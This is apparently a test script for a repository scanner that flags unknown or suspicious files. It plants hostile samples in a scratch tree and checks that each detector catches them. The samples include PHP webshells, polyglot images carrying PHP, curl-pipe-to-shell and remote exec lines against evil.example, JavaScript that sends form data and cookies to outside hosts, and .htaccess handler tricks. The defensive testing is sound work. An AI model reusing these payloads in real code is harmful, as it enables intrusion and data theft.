  put('sporta-web/.env', `APP_ENV=production\nDB_PASSWORD=${ENVPW}\n`)
  put('sporta-web/ops/deploy_key.pem', KEY)
  put('sporta-web/public/config.js.bak', 'window.SPORTA_CONFIG={}\n')
  put('sporta-web/public/cats/desktop/thumb.php', '<?php echo 1;\n')
  put('sporta-web/public/images/products/photo.jpg.php', '<?php echo 2;\n')
  put('sporta-web/public/cats/mobile/evil.php.jpg', Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10]), Buffer.from("JFIF\0<?php system($_GET['c']); ?>"), crypto.randomBytes(64)]))
  put('sporta-web/public/extra.css', 'body{}\n', { mode: 0o755 })
  put('sporta-web/public/Logo.png', fs.readFileSync(path.join(ROOT, 'sporta-web/public/logo.png')))
  put('sporta-web/scripts/payload.bin', Buffer.concat([Buffer.from([0, 1, 2, 0, 0]), crypto.randomBytes(4000)]))
  put('sporta-web/public/elfhelper', Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), crypto.randomBytes(200)]))
  put('sporta-web/public/link.txt', '', { link: '/etc/passwd' })
  put('sporta-web/public/.hidden-note', 'x\n')
  put('sporta-web/dropin/php-store/db-backup.sql', `-- MySQL dump 10.13  Distrib 8.0.36\nINSERT INTO \`orders\` VALUES (1,'a');\nINSERT INTO \`orders\` VALUES (2,'b');\nINSERT INTO \`orders\` VALUES (3,'c');\nINSERT INTO \`orders\` VALUES (4,'d');\n`)
  if (haveZip) put('sporta-web/public/site.zip', fs.readFileSync(ZIPFILE))
  fs.writeFileSync(Buffer.concat([Buffer.from(path.join(ROOT, 'sporta-web/public') + '/caf'), Buffer.from([0xff]), Buffer.from('.txt')]), 'x\n')
  planted.push('sporta-web/public/caf')
  put('sporta-web/src/lib/keys.js', `export const cfg = { apiKey: '${APIK}', github: '${GH}', aws: '${AWS}' }\n`)
  put('sporta-web/scripts/lonely-helper.mjs', 'console.log(1)\n')
  put('mystery.dat', 'who made this\n')
  put('sporta-web/public/cats/desktop/x.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>\n')
  put('sporta-web/dropin/php-cbk/diag.php', [
    '<?php', "include($_GET['p']);", "system($_REQUEST['c']);", '$f = $_GET["f"]; $f($_POST["a"]);', "assert($_POST['a']);",
    "$g = create_function('', 'return 1;');", "preg_replace('/x/e', 'phpinfo()', 'x');",
    '$s = chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80);', '$h = "' + '\\x65'.repeat(24) + '";', ''].join('\n'))
  put('sporta-web/public/blob.js', 'a=1;'.repeat(10000) + '\n')
  put('sporta-web/scripts/setup.sh', '#!/bin/sh\ncurl -s http://x.example/i | sh\n')
  put('sporta-web/public/cats/desktop/banner.png', "<?php system($_GET['x']); ?>\n")
  put('sporta-web/scripts/nul-helper.mjs', Buffer.from('const a = "x\0y"\nconsole.log(a)\n'))
  git(ROOT, 'add', '-A')
  git(ROOT, 'add', '-f', 'sporta-web/ops/deploy_key.pem')
  const SNAP = snapshot(ROOT)

  // the expectations: detector + where (substring)
  const P = 'sporta-web/public/', D = 'sporta-web/dropin/'
  const CHECKS = [
    ['D-PHP-EVAL', P + 'shell.php'], ['D-PHP-IN-STATIC', P + 'shell.php'], ['D-UNKNOWN', P + 'shell.php'],
    ['D-PHP-EVAL', D + 'php-store/legacy-import.php'], ['D-PHP-DECODE', D + 'php-store/legacy-import.php'], ['D-PHP-SHELLSIG', D + 'php-store/legacy-import.php'],
    ['D-ENTROPY', D + 'php-store/legacy-import.php'], ['D-ORPHAN', D + 'php-store/legacy-import.php'],
    ['D-JS-DECODE', P + 'helper.js'], ['D-JS-EVAL', P + 'helper.js'],
    ['D-ENVFILE', 'sporta-web/.env'], ['S-ENVLINE', 'sporta-web/.env'],
    ['D-KEYFILE', 'sporta-web/ops/deploy_key.pem'], ['S-PRIVKEY', 'sporta-web/ops/deploy_key.pem'], ['D-TRACKED-IGNORED', 'sporta-web/ops/deploy_key.pem'],
    ['D-BACKUP-NAME', P + 'config.js.bak'], ['D-UNKNOWN', P + 'config.js.bak'],
    ['D-PHP-IN-MEDIA', P + 'cats/desktop/thumb.php'], ['D-PHP-IN-STATIC', P + 'cats/desktop/thumb.php'],
    ['D-DOUBLE-EXT', P + 'images/products/photo.jpg.php'], ['D-PHP-IN-MEDIA', P + 'images/products/photo.jpg.php'],
    ['D-POLYGLOT', P + 'cats/mobile/evil.php.jpg'], ['D-DOUBLE-EXT', P + 'cats/mobile/evil.php.jpg'],
    ['D-EXEC-BIT', P + 'extra.css'],
    ['D-CASE-COLLIDE', P + 'logo.png'],
    ['D-BINARY-UNK', 'sporta-web/scripts/payload.bin'], ['D-UNKNOWN', 'sporta-web/scripts/payload.bin'],
    ['D-BINARY-UNK', P + 'elfhelper'],
    ['D-SYMLINK', P + 'link.txt'],
    ['D-HIDDEN', P + '.hidden-note'], ['D-UNKNOWN', P + '.hidden-note'],
    ['D-SQL-DUMP', D + 'php-store/db-backup.sql'],
    ...(haveZip ? [['D-ARCHIVE', P + 'site.zip']] : []),
    ['D-NAME-ODD', P + 'caf'],
    ['S-NAMED', 'sporta-web/src/lib/keys.js'], ['S-GITHUB', 'sporta-web/src/lib/keys.js'], ['S-AWS', 'sporta-web/src/lib/keys.js'],
    ['D-ORPHAN', 'sporta-web/scripts/lonely-helper.mjs'],
    ['D-UNKNOWN', 'mystery.dat'],
    ['D-SVG-ACTIVE', P + 'cats/desktop/x.svg'],
    ['D-PHP-USERINC', D + 'php-cbk/diag.php'], ['D-PHP-EXEC', D + 'php-cbk/diag.php'], ['D-PHP-VARFUNC', D + 'php-cbk/diag.php'], ['D-PHP-ASSERT', D + 'php-cbk/diag.php'],
    ['D-PHP-CREATEFN', D + 'php-cbk/diag.php'], ['D-PHP-PREG-E', D + 'php-cbk/diag.php'], ['D-CHR-BUILD', D + 'php-cbk/diag.php'], ['D-HEX-STRING', D + 'php-cbk/diag.php'],
    ['D-LONGLINE', P + 'blob.js'],
    ['D-SHELL-PIPE', 'sporta-web/scripts/setup.sh'],
    ['D-BINARY-UNK', P + 'cats/desktop/banner.png'], ['D-PHP-EXEC', P + 'cats/desktop/banner.png'],
    ['D-NUL-IN-TEXT', 'sporta-web/scripts/nul-helper.mjs'],
  ]

  // ------------------------------------------------ 1. every planted file is found, nothing else is new
  const B1 = scan(ROOT)
  check(!!B1.json, 'planted tree: the scan runs', B1.stderr.slice(0, 300))
  if (!B1.json) return
  check(B1.status === 1, `planted tree: exit code 1 (blocking findings), got ${B1.status}`)
  let missed = 0
  for (const [det, where] of CHECKS) {
    const found = has(B1, det, where)
    if (!found) missed++
    check(found, `planted ${det.padEnd(18)} ${where}`)
  }
  const before = new Set(findingsOf(B0).map(key))
  const fresh = findingsOf(B1).filter((f) => !before.has(key(f)))
  const stray = fresh.filter((f) => !planted.some((p) => f.where === p || f.where.startsWith(p)) && !['D-DUPLICATE', 'D-LARGE', 'D-CASE-COLLIDE'].includes(f.detector))
  check(stray.length === 0, `nothing else is newly flagged (${fresh.length} new findings, all on planted files)`, stray.slice(0, 5).map(key).join('; '))
  const unknownNow = new Set(B1.json.unknown.map((u) => u.path))
  check(['sporta-web/public/shell.php', 'mystery.dat', 'sporta-web/public/config.js.bak', 'sporta-web/public/.hidden-note'].every((p) => unknownNow.has(p)), 'planted strangers are listed as UNKNOWN files')
  check(B1.json.suspicious_files.includes('sporta-web/public/shell.php') && B1.json.suspicious_files.includes('sporta-web/ops/deploy_key.pem'), 'planted webshell and key file are listed as SUSPICIOUS files')
  const leaked = [SEC_DB, SEC_CRON, SEC_PEM.slice(0, 40), SEC_ZIP, APIK, GH, AWS, ENVPW].filter((v) => B1.text.includes(v))
  check(leaked.length === 0, 'no planted secret value appears in the JSON or the Markdown', `${leaked.length} leaked`)
  const mask = findingsOf(B1).find((f) => f.detector === 'S-NAMED' && f.where.endsWith('keys.js'))
  check(!!mask && /\b\w{0,4}…\(\d+\)/.test(mask.evidence) && !mask.evidence.includes(APIK.slice(0, 8)), 'a secret is shown as at most four characters and a length', mask?.evidence?.slice(0, 120))
  const pk = findingsOf(B1).find((f) => f.detector === 'S-PRIVKEY')
  check(!!pk && /no value shown/.test(pk.evidence), 'a private-key block shows nothing but that one exists')

  // ------------------------------------------------ 2. writes nothing, rewrites nothing
  check(snapshot(ROOT) === SNAP, 'the scan changed nothing in the scanned tree (HEAD, refs, index/status, object count)')

  // ------------------------------------------------ 4. deterministic
  const B1b = scan(ROOT)
  check(B1b.text === B1.text && B1.text.length > 1000, `two runs on the same tree are byte-identical (${B1.text.length} bytes)`)

  // ------------------------------------------------ 5. exit codes on a tiny tree
  const MINI = path.join(TMP, 'mini'); fs.mkdirSync(MINI, { recursive: true })
  fs.writeFileSync(path.join(MINI, 'README.md'), '# hi\n')
  git(MINI, 'init', '-q', '-b', 'main'); git(MINI, 'add', '-A'); git(MINI, 'commit', '-q', '-m', 'm')
  const MINIMAN = path.join(TMP, 'mini-manifest.json')
  fs.writeFileSync(MINIMAN, JSON.stringify({ rules: [{ id: 'R-README', glob: ['README.md'], purpose: 'docs', owner: 'test', web: false }] }))
  const M0 = scan(MINI, [], {}, MINIMAN)
  check(M0.status === 0 && M0.json.counts.unknown === 0, `a fully explained tree exits 0 (${M0.json?.counts?.entries} entry, ${M0.json?.counts?.unknown} unknown)`)
  fs.writeFileSync(path.join(MINI, 'stray.dat'), 'x')
  const M1 = scan(MINI, [], {}, MINIMAN)
  check(M1.status === 1 && M1.json.counts.unknown === 1, 'one unexplained file makes it exit 1 and count 1 UNKNOWN')
  fs.writeFileSync(MINIMAN, JSON.stringify({ rules: [{ id: 'R-README', glob: ['README.md'], purpose: 'docs', owner: 'test', web: false }], acknowledged: [] }))
  const M2 = spawnSync(process.execPath, [SCAN, '--root', MINI, '--manifest', '/nonexistent.json', '--quiet'], { encoding: 'utf8' })
  check(M2.status === 2, 'a missing manifest is a usage error (exit 2)')

  // ------------------------------------------------ 3. history
  const Hh = scan(ROOT, ['--no-tree', '--history'])
  const H = Hh.json?.history
  check(!!H, 'history scan of the scratch repository runs', Hh.stderr.slice(-300))
  if (H) {
    const g = H.secret_groups.filter((x) => x.paths.includes('sporta-web/old-deploy/config.php'))
    check(g.length >= 2 && g.every((x) => x.verdict === 'real' && x.in_head === false && x.first_commit === H1), `history: the committed-then-deleted db_pass and cron_key are found (real, first commit ${H1}, not in HEAD)`, JSON.stringify(g.map((x) => [x.key, x.verdict, x.first_commit, x.in_head])))
    const nm = H.name_sweep.find((x) => x.path === 'sporta-web/old-deploy/config.php')
    check(!!nm && nm.class === 'config-or-env' && nm.first_commit === H1 && nm.in_head === false, 'history: a config.php that was ever added is named, with its first commit and "not in HEAD"')
    check(H.top_blobs[0]?.path === 'sporta-web/old-deploy/blob.bin' && H.top_blobs[0].size === 3_000_000 && H.top_blobs[0].in_head === false, 'history: the biggest blob ever committed is ranked first with its path')
    if (haveZip) {
      const z = H.zips.find((x) => x.path.endsWith('old-deploy/bundle.zip'))
      check(!!z && z.names_of_note.includes('api/config.php') && z.in_head === false, 'history: a zip holding api/config.php is opened and the member is named')
    }
    check(H.sql_dumps.some((d) => d.path === 'sporta-web/old-deploy/dump.sql'), 'history: a SQL dump is named')
    check(H.dead_weight.blobs_not_in_head >= 4, `history: blobs no longer in HEAD are counted (${H.dead_weight.blobs_not_in_head})`)
    check(H.proposal.commands.join('\n').includes('filter-repo') && /PROPOSAL ONLY/.test(H.proposal.note) && H.proposal.blast_radius.length >= 3, 'history: a cleanup is PROPOSED with its blast radius, never run')
    const hl = [SEC_DB, SEC_CRON, SEC_ZIP].filter((v) => Hh.text.includes(v))
    check(hl.length === 0, 'history: no secret value reaches the JSON or the Markdown', `${hl.length} leaked`)
  }
  check(snapshot(ROOT) === SNAP, 'the history scan rewrote nothing (HEAD, refs, status, object count unchanged)')

  // ------------------------------------------------ 6. a fake staged package
  const STAGE = path.join(TMP, 'stage'); const pub = path.join(STAGE, 'public_html')
  for (const d of ['api', 'assets', 'knet']) fs.mkdirSync(path.join(pub, d), { recursive: true })
  fs.mkdirSync(path.join(STAGE, 'database-sql'), { recursive: true })
  fs.writeFileSync(path.join(pub, 'index.html'), '<!doctype html><title>x</title>')
  fs.copyFileSync(path.join(REPO, 'sporta-web/public/.htaccess'), path.join(pub, '.htaccess'))
  fs.copyFileSync(path.join(REPO, 'sporta-web/dropin/php-store/store.php'), path.join(pub, 'api/store.php'))
  fs.writeFileSync(path.join(pub, 'assets/app-abc123.js'), 'console.log(1)')
  fs.writeFileSync(path.join(pub, 'shell.php'), `<?php @eval($_POST['cmd']); ?>`)
  fs.writeFileSync(path.join(pub, 'api/config.php'), `<?php return ['db_pass' => '${rnd(20)}'];`)
  fs.writeFileSync(path.join(STAGE, 'database-sql/IMPORT-THIS-ONE.sql'), '-- sql\n')
  const PK = scan(ROOT, ['--no-tree', '--package', STAGE])
  const pk2 = PK.json?.package
  check(!!pk2, 'package: a staged tree is classified', PK.stderr.slice(-300))
  if (pk2) {
    check(pk2.unknown.includes('public_html/shell.php') && pk2.unknown.includes('public_html/api/config.php'), 'package: a PHP file with no source and a config.php in api/ are UNKNOWN')
    check(has(PK, 'D-PHP-EVAL', 'package:public_html/shell.php'), 'package: the eval in the staged shell is found')
    check(has(PK, 'D-ENVFILE', 'package:public_html/api/config.php'), 'package: a config.php inside the package is a credential finding')
    check(pk2.known >= 4 && pk2.by_rule['PKG-BACKEND-SOURCE'] >= 1 && pk2.by_rule['PKG-VITE-ASSETS'] === 1, `package: real files are matched to their source (${pk2.known} known: ${JSON.stringify(pk2.by_rule)})`)
    check(pk2.file_audit.exit === 1 && /high/.test(pk2.file_audit.summary), `package: file-audit.mjs ran on the staged tree and refused it (${pk2.file_audit.summary})`)
  }

  // ------------------------------------------------ 8. mutations
  // Blind detectors in groups; every check tied to a blinded detector must fail and every other must still pass.
  const dets = [...new Set(CHECKS.map((c) => c[0]))]
  const groups = [0, 1, 2].map((m) => dets.filter((_, i) => i % 3 === m))
  for (const [gi, grp] of groups.entries()) {
    const R = scan(ROOT, [], { UFS_BLIND: grp.join(',') })
    if (!R.json) { bad(`mutation group ${gi + 1} runs`, R.stderr.slice(0, 200)); continue }
    let wrong = []
    for (const [det, where] of CHECKS) {
      const found = has(R, det, where)
      if (grp.includes(det) && found) wrong.push(`${det} still reported at ${where}`)
      if (!grp.includes(det) && !found && has(B1, det, where)) wrong.push(`${det} at ${where} lost without being blinded`)
    }
    check(wrong.length === 0, `mutation: blinding ${grp.length} detectors (${grp.slice(0, 4).join(', ')}${grp.length > 4 ? ', ...' : ''}) fails exactly their ${CHECKS.filter((c) => grp.includes(c[0])).length} checks`, wrong.slice(0, 3).join('; '))
  }
  fs.writeFileSync(path.join(TMP, 'empty-manifest.json'), '{"rules":[]}')
  const E2 = scan(ROOT, [], {}, path.join(TMP, 'empty-manifest.json'))
  check(!!E2.json && E2.json.counts.unknown > B0.json.counts.unknown + 50, `mutation: an emptied manifest leaves the tree full of UNKNOWN files (${E2.json?.counts?.unknown} vs ${B0.json.counts.unknown})`)
  if (H) {
    for (const [gate, probe] of [['S-NAMED', (h) => h.secret_groups.filter((x) => x.id === 'S-NAMED' && x.paths.includes('sporta-web/old-deploy/config.php')).length === 0],
      ['H-SECRETS', (h) => h.secret_groups.length === 0], ['H-NAMES', (h) => h.name_sweep.length === 0], ['H-BLOAT', (h) => h.top_blobs.length === 0], ['H-ZIPS', (h) => h.zips.length === 0]]) {
      const R = scan(ROOT, ['--no-tree', '--history'], { UFS_BLIND: gate })
      check(!!R.json?.history && probe(R.json.history), `mutation: blinding ${gate} removes exactly its history evidence`)
    }
  }

  // ------------------------------------------------ 7. the real tree
  const RT = scan(REPO)
  check(!!RT.json, 'real tree: the scan runs', RT.stderr.slice(0, 300))
  if (RT.json) {
    const c = RT.json.counts
    check(c.entries === c.known_by_rule + c.known_by_reference + c.unknown + c.named_only_in_docs + c.tracked_missing_on_disk, `real tree: ${c.entries} entries (${c.scanned} files), each classified exactly once: ${c.known_by_rule} by a rule, ${c.known_by_reference} by a reference, ${c.unknown} unknown, ${c.named_only_in_docs} named only in docs`)
    const unk = RT.json.unknown
    const trackedUnknown = unk.filter((u) => u.tracked)
    check(trackedUnknown.length === 0, 'real tree: no TRACKED file is unexplained (every committed file has a rule or a reference)', trackedUnknown.slice(0, 5).map((u) => u.path).join('; '))
    for (const u of unk.filter((x) => !x.tracked)) console.log(`note untracked and unexplained (a running session's scratch?): ${u.path}`)
    const untrackedUnknown = new Set(unk.filter((u) => !u.tracked).map((u) => u.path))
    const hi = findingsOf(RT).filter((f) => f.severity === 'high' && !f.acknowledged)
    check(hi.length === 0, 'real tree: no unexplained HIGH finding (no secret, no executable web file, no webshell shape)', hi.slice(0, 4).map((f) => `${f.detector} ${f.where}`).join('; '))
    const blocking = findingsOf(RT).filter((f) => RT.json.blocking.includes(f.id))
    const undocumented = blocking.filter((f) => !f.documented && !(f.detector === 'D-UNKNOWN' && untrackedUnknown.has(f.where)))
    check(undocumented.length === 0, `real tree: every blocking finding is documented in ops/known-files.json (${blocking.length} blocking, exit ${RT.status})`, undocumented.slice(0, 4).map((f) => `${f.detector} ${f.where}`).join('; '))
    check(RT.status === (blocking.length ? 1 : 0), 'real tree: the exit code follows the blocking findings')
    check((RT.json.unused_rules || []).length === 0, 'real tree: every non-optional rule in the manifest still matches a file', (RT.json.unused_rules || []).join(', '))
    const doc = ['D-TRACKED-IGNORED|SPORTA-BACKEND.zip', 'D-STALE-COPY|sporta-live/', 'D-GENERATED|brand/hero/__pycache__/grade.cpython-311.pyc', 'D-SENSITIVE-DATA|sporta-web/data/ahed.json']
    const keys = new Set(findingsOf(RT).map(key))
    for (const d of doc) if (!keys.has(d)) console.log(`note ${d.replace('|', ' ')}: documented finding is gone (resolved? then remove it from ops/FILES-SCAN.md)`)
    check(RT.json.archives.some((a) => a.path === 'SPORTA-BACKEND.zip') || !fs.existsSync(path.join(REPO, 'SPORTA-BACKEND.zip')), 'real tree: SPORTA-BACKEND.zip is opened and compared with the tree')
    check(Object.keys(RT.json.trees).sort().join() === 'brand,sporta-app,sporta-html5,sporta-live', 'real tree: the side trees are described (sporta-live, sporta-html5, sporta-app, brand)')
  }
}

// ================================================================ verify section
// The shapes the first detector set let through. Found by an independent verifier (2026-11-04) who planted
// 71 variants on paths a manifest rule already explains (so only the content and name detectors could catch
// them): 24 were reported. This section holds the variants that were missed, a set of NEGATIVE controls
// (ordinary code that must stay quiet), and a mutation for every new detector: blind it, and exactly the
// checks that depend on it must fail.
//
//   node scripts/unknown-files-test.mjs --section verify
async function verifySection() {
  console.log('\n== verify: shapes the first detector set let through, negative controls, mutations')
  const SCAN = path.join(HERE, 'unknown-files-scan.mjs')
  const MAN = path.join(WEB, 'ops', 'known-files.json')
  let runNo = 0
  const rnd = (n) => crypto.randomBytes(n * 2).toString('base64').replace(/[^A-Za-z0-9]/g, '').padEnd(n, 'q').slice(0, n)
  const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8', maxBuffer: 1 << 28, stdio: ['ignore', 'pipe', 'pipe'] })
  const scanV = (root, env = {}) => {
    const out = path.join(TMP, `verify-run-${++runNo}.json`)
    const r = spawnSync(process.execPath, [SCAN, '--root', root, '--manifest', MAN, '--json', out, '--quiet'], { encoding: 'utf8', env: { ...process.env, ...env }, maxBuffer: 1 << 28 })
    const json = fs.existsSync(out) ? JSON.parse(fs.readFileSync(out, 'utf8')) : null
    return { status: r.status, stderr: r.stderr || '', json, text: json ? fs.readFileSync(out, 'utf8') : '' }
  }
  const fOf = (R) => R.json?.findings || []
  const hasV = (R, det, where) => fOf(R).some((f) => f.detector === det && (f.where === where || f.where.includes(where)))
  const keyV = (f) => `${f.detector}|${f.where}`

  const ROOT = path.join(TMP, 'verify-tree')
  fs.mkdirSync(ROOT, { recursive: true })
  const arch = spawnSync('git', ['-C', REPO, 'archive', 'HEAD'], { maxBuffer: 1 << 30 })
  const tar = spawnSync('tar', ['-x', '-C', ROOT], { input: arch.stdout, maxBuffer: 1 << 28 })
  check(arch.status === 0 && tar.status === 0, 'verify: scratch copy of the tree (git archive HEAD)')
  git(ROOT, 'init', '-q', '-b', 'main'); git(ROOT, 'add', '-A'); git(ROOT, 'commit', '-q', '-m', 'base')
  const B0 = scanV(ROOT)
  if (!B0.json) { bad('verify: baseline scan runs', B0.stderr.slice(0, 300)); return }

  const planted = []
  const put = (rel, body) => { const p = path.join(ROOT, rel); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, body); planted.push(rel) }
  const edit = (rel, fn) => { const p = path.join(ROOT, rel); fs.writeFileSync(p, fn(fs.readFileSync(p, 'utf8'))); planted.push(rel) }
  const D = 'sporta-web/dropin/php-store/', L = 'sporta-live/zz/', S = 'sporta-web/scripts/', CATS = 'sporta-web/public/cats/desktop/'
  const jpg = (extra) => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0]), extra, Buffer.from([0xff, 0xd9])])
  const PASS24 = 'Xk9' + rnd(21), TOK = 'q8Z' + rnd(21), RANDOM35 = 'Rk7' + rnd(32)
  const NPM = 'npm_' + rnd(36), SG = 'SG.' + rnd(22) + '.' + rnd(43), TG = '123456789:AA' + rnd(33), DOK = 'dop_v1_' + crypto.randomBytes(32).toString('hex')

  // --- PHP
  put(D + 'v-callback.php', "<?php preg_replace_callback('/.*/', $_POST['f'], $_POST['x']);\n")
  put(D + 'v-usort.php', "<?php $a = [1, 2]; usort($a, $_GET['f']);\n")
  put(D + 'v-arraymap.php', "<?php array_map($_POST['f'], [$_POST['x']]);\n")
  put(D + 'v-stream-data.php', "<?php include 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+';\n")
  put(D + 'v-stream-input.php', "<?php include 'php://input';\n")
  put(D + 'v-paren.php', "<?php ($_GET['a'])($_GET['b']);\n")
  put(D + 'v-input-fn.php', "<?php $f = \"ass\" . \"ert\"; $f(file_get_contents('php://input'));\n")
  put(D + 'v-headers.php', "<?php $f = 'sys' . 'tem'; $f(getallheaders()['X-C']);\n")
  put(D + 'v-extract.php', "<?php extract($_POST); echo $name;\n")
  put(D + 'v-dropper.php', "<?php $s = base64_decode($_POST['p']); file_put_contents('x.php', $s);\n")
  put(D + 'ok-control.php', "<?php\n$raw = file_get_contents('php://input', false, null, 0, 8193);\n$x = array_map('trim', $_POST);\nusort($rows, fn($a, $b) => $a <=> $b);\n$r = array_filter($_POST);\nrequire __DIR__ . '/config-path.php';\nfile_put_contents($dir . '/note.txt', $raw);\n$id = (int) $_GET['id'];\n")
  // --- JS (zone web)
  put(L + 'j-timeout.js', "setTimeout(atob('YWxlcnQoMSk='), 0);\n")
  put(L + 'j-ctor.js', "[].constructor.constructor(atob('YWxlcnQoMSk='))();\n")
  put(L + 'j-import.js', "import('data:text/javascript;base64,YWxlcnQoMSk=');\n")
  put(L + 'j-window.js', "window['ev' + 'al'](atob('YWxlcnQoMSk='));\n")
  put(L + 'j-script.js', "var s = document.createElement('script'); s.src = 'https://cdn-analytics.example/t.js'; document.head.appendChild(s);\n")
  put(L + 'j-beacon.js', "document.addEventListener('submit', function (e) { navigator.sendBeacon('https://collect.example/c', new FormData(e.target)) }, true);\n")
  put(L + 'j-image.js', "new Image().src = 'https://t.example/p?c=' + encodeURIComponent(document.cookie);\n")
  put(L + 'j-bidi.js', "const isAdmin = false\nif (isAdmin) { /* \u202E } \u2066if (isAdmin)\u2069 \u2066 begin admin only */ grant() }\n")
  put(L + 'j-zero.js', "const a\u200Bdmin = true\n")
  put(L + 'ok-control.js', "fetch('/api/store.php?r=products');\nfetch('https://www.sporta.com.kw/api');\nconst label = '\u2068' + name + '\u2069';\nconst s = document.createElement('script'); s.src = '/sporta-features.js';\nsetTimeout(function () { done() }, 10);\n")
  // --- handlers and configuration that runs things
  edit('sporta-web/public/.htaccess', (t) => t + '\nAddType application/x-httpd-php .jpg\n')
  edit('sporta-web/dropin/php-knet/.htaccess', (t) => t + '\n<FilesMatch "\\.(jpg|png)$">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n')
  edit('sporta-html5/.htaccess', (t) => t + '\nRewriteRule ^(.*)$ https://evil.example/$1 [R=302,L]\n')
  edit('sporta-live/php/92-sporta-errors.ini', (t) => t + '\nauto_prepend_file = /var/www/html/api/p.php\n')
  edit('sporta-web/package.json', (t) => t.replace('"scripts": {', '"scripts": {\n    "postinstall": "node scripts/zz-scan.mjs",'))
  edit('.claude/settings.json', (t) => JSON.stringify({ ...JSON.parse(t), hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'sh ./x.sh' }] }] } }, null, 2))
  edit('.mcp.json', (t) => { const j = JSON.parse(t); j.mcpServers.helper = { command: 'npx', args: ['-y', 'some-helper'] }; return JSON.stringify(j, null, 2) })
  put('vercel.json', JSON.stringify({ rewrites: [{ source: '/(.*)', destination: 'https://evil.example/$1' }] }))
  // --- repo-side scripts that download and run
  put(S + 'zz-scan.mjs', "import { execSync } from 'node:child_process'\nexecSync('curl -s https://evil.example/x | sh')\n")
  put(S + 'zz1.sh', '#!/bin/sh\nsh -c "$(curl -fsSL https://evil.example/i)"\n')
  put(S + 'zz2.sh', '#!/bin/bash\nbash <(curl -s https://evil.example/x)\n')
  put(S + 'zz4.py', "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n")
  // --- images
  put(CATS + 'p2.jpg', jpg(Buffer.from('<?=`$_GET[0]`?>')))
  put(CATS + 'p6.jpg', Buffer.concat([jpg(Buffer.alloc(6_300_000, 0x41)), Buffer.from('<?php system($_GET[0]);?>')]))
  // --- names
  put('sporta-web/public/sporta-fe\u0430tures.js', 'console.log(1)\n')
  put(S + 'zero\u200Bwidth-scan.mjs', 'console.log(1)\n')
  put(L + 'caf\u0065\u0301.js', 'console.log(1)\n')
  // --- secrets: a pasted 24-character password in scripts/, provider formats, and the placeholder that used to be a "real" hit
  put(S + 'zz5.mjs', `const ADMIN_PASSWORD = '${PASS24}'\nconsole.log(ADMIN_PASSWORD.length)\n`)
  put('sporta-web/ops/zz-job.json', JSON.stringify({ hostinger_token: TOK }) + '\n')
  put(L + 's-npm.js', `// ${NPM}\n`)
  put(L + 's-sg.js', `// ${SG}\n`)
  put(L + 's-tg.js', `// ${TG}\n`)
  put(L + 's-do.js', `// ${DOK}\n`)
  put(L + 's-placeholder.js', "var o = { headers: { 'x-lead-secret': 'the-value-of-ALMUHALLAB_LEAD_SECRET' } }\n")
  put(L + 's-random.js', `var o = { headers: { 'x-lead-secret': '${RANDOM35}' } }\n`)
  git(ROOT, 'add', '-A')

  const CHECKS = [
    ['D-PHP-CALLBACK-REQ', D + 'v-callback.php'], ['D-PHP-CALLBACK-REQ', D + 'v-usort.php'], ['D-PHP-CALLBACK-REQ', D + 'v-arraymap.php'],
    ['D-PHP-STREAM-INC', D + 'v-stream-data.php'], ['D-PHP-STREAM-INC', D + 'v-stream-input.php'],
    ['D-PHP-VARFUNC', D + 'v-paren.php'], ['D-PHP-VARFUNC', D + 'v-input-fn.php'], ['D-PHP-VARFUNC', D + 'v-headers.php'],
    ['D-PHP-EXTRACT-REQ', D + 'v-extract.php'], ['D-PHP-DROPPER', D + 'v-dropper.php'],
    ['D-JS-DYNEXEC', L + 'j-timeout.js'], ['D-JS-DYNEXEC', L + 'j-ctor.js'], ['D-JS-DYNEXEC', L + 'j-import.js'], ['D-JS-DYNEXEC', L + 'j-window.js'],
    ['D-JS-FOREIGN', L + 'j-script.js'], ['D-JS-FOREIGN', L + 'j-beacon.js'], ['D-JS-FOREIGN', L + 'j-image.js'],
    ['D-BIDI-IN-SOURCE', L + 'j-bidi.js'], ['D-BIDI-IN-SOURCE', L + 'j-zero.js'],
    ['D-HT-HANDLER', 'sporta-web/public/.htaccess'], ['D-HT-HANDLER', 'sporta-web/dropin/php-knet/.htaccess'], ['D-HT-REDIRECT', 'sporta-html5/.htaccess'], ['D-HT-HANDLER', 'sporta-live/php/92-sporta-errors.ini'],
    ['D-CONFIG-EXEC', 'sporta-web/package.json'], ['D-CONFIG-EXEC', '.claude/settings.json'], ['D-CONFIG-EXEC', '.mcp.json'], ['D-CONFIG-EXEC', 'vercel.json'],
    ['D-SHELL-PIPE', S + 'zz-scan.mjs'], ['D-SHELL-PIPE', S + 'zz1.sh'], ['D-SHELL-PIPE', S + 'zz2.sh'], ['D-SHELL-PIPE', S + 'zz4.py'],
    ['D-POLYGLOT', CATS + 'p2.jpg'], ['D-POLYGLOT', CATS + 'p6.jpg'],
    ['D-NAME-ODD', 'sporta-web/public/sporta-fe\u0430tures.js'], ['D-NAME-ODD', S + 'zero\u200Bwidth-scan.mjs'], ['D-NAME-ODD', L + 'caf\u0065\u0301.js'],
    ['S-NAMED', S + 'zz5.mjs'], ['S-NAMED', 'sporta-web/ops/zz-job.json'], ['S-NPM', L + 's-npm.js'], ['S-SENDGRID', L + 's-sg.js'], ['S-TELEGRAM', L + 's-tg.js'], ['S-DOSHOP', L + 's-do.js'],
    ['S-NAMED', L + 's-random.js'],
  ]
  const CONTROLS = [D + 'ok-control.php', L + 'ok-control.js', L + 's-placeholder.js']
  const R1 = scanV(ROOT)
  check(!!R1.json, 'verify: the planted tree scans', R1.stderr.slice(0, 300))
  if (!R1.json) return
  for (const [det, where] of CHECKS) check(hasV(R1, det, where), `verify: ${det.padEnd(18)} ${where.replace(/[^\x20-\x7e]/g, '?')}`)
